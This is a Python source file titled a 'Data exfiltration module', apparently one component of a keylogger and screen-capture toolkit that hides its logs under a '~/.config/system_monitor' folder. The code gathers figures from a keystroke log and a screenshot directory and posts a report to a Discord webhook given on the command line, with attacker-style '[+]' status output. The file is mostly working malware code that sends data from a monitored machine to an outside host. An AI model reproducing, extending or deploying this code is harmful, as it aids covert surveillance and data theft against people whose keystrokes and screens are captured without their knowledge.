"""Data exfiltration module - Send data to Discord"""

import json
import requests
from pathlib import Path
from datetime import datetime


def collect_data(log_dir: str = "~/.config/system_monitor/logs") -> dict:
    log_dir = Path(log_dir).expanduser()
    log_dir.mkdir(parents=True, exist_ok=True)
    
    data = {
        'collected_at': datetime.now().isoformat(),
        'total_keystrokes': 0,
        'screenshots': 0
    }
    
    # Compte les keystrokes
    keystroke_file = log_dir / "keystrokes.txt"
    if keystroke_file.exists():
        try:
            with open(keystroke_file, 'r') as f:
                data['total_keystrokes'] = len(f.readlines())
        except:
            pass
    
    # screenshots
    screenshot_dir = log_dir / "screenshots"
    if screenshot_dir.exists():
        data['screenshots'] = len(list(screenshot_dir.glob("*.png")))
    
    return data


def send_to_discord(webhook_url: str, log_dir: str = "~/.config/system_monitor/logs") -> bool:
    """Send data to Discord webhook."""
    try:
        data = collect_data(log_dir)
        
        # Discord message
        message = {
            "embeds": [{
                "title": "System Monitoring Report",
                "description": f"Report {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}",
                "fields": [
                    {
                        "name": "Keystrokes",
                        "value": str(data['total_keystrokes']),
                        "inline": True
                    },
                    {
                        "name": "Screenshots",
                        "value": str(data['screenshots']),
                        "inline": True
                    }
                ],
                "color": 16711680,
                "timestamp": data['collected_at']
            }]
        }
        
        # Send
        response = requests.post(webhook_url, json=message, timeout=10)
        
        if response.status_code in [200, 204]:
            print(f"[+] Report sent to Discord")
            return True
        else:
            print(f"[!] Discord error: {response.status_code}")
            return False
    
    except requests.exceptions.RequestException as e:
        print(f"[!] Network error: {e}")
        return False
    except Exception as e:
        print(f"[!] Error: {e}")
        return False


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) > 1:
        webhook_url = sys.argv[1]
        print(f"[*] Testing webhook...")
        success =send_to_discord(webhook_url)
        if success:
            print("Succès")
        else:
            print("Échec")
    else:
        print("Usage: python exfiltration.py <webhook_url>")
        print("Example: python exfiltration.py https://discord.com/api/webhooks/...")
